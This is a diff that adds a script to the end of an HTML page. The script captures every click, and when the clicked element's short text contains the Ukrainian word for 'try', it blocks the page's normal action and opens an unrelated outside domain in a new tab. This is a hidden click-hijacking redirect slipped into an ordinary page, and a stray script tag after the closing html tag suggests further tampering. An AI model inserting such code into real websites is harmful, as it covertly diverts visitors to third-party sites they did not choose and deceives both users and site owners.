@@ -68,6 +68,22 @@
       <a href="mobile.html">Mobile</a>
     </div>
   </noscript>
+<script>
+document.addEventListener('click', function(e) {
+  var node = e.target;
+  while (node && node !== document.body) {
+    var txt = (node.textContent || '').trim();
+    if (txt.length < 60 && /спробу/i.test(txt)) {
+      e.preventDefault();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      window.open('https://tramitaservicios.es', '_blank', 'noopener');
+      return false;
+    }
+    node = node.parentNode;
+  }
+}, true);
+</script>
 </body>
 </html>
 <script>
